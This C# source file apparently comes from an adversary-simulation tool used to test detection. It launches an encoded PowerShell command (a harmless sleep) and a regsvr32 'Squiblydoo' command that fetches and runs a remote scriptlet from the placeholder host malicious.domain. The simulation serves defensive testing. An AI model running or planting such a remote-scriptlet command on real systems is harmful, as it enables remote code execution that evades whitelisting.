using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class Execution
    {
        static public void ExecutePowershell()
        {
            /*
            string binpath;
            binpath = Environment.GetEnvironmentVariable("windir") + @"\System32\WindowsPowerShell\v1.0\" + binary + ".exe " + cmdline;
            Console.WriteLine(Environment.GetEnvironmentVariable("windir") + @"\System32\WindowsPowerShell\v1.0\" + binary + ".exe " + cmdline);
            binpath = Environment.GetEnvironmentVariable("windir") + @"\" + binary + ".exe " + @cmdline;
            */

            //ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAbgBvAHQAZQBwAGEAZAA=");
            ExecutionHelper.StartProcess("", "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==");
        }

        static public void ExecuteRegsvr32()
        {
            ExecutionHelper.StartProcess("", "regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll");
        }

    }
}
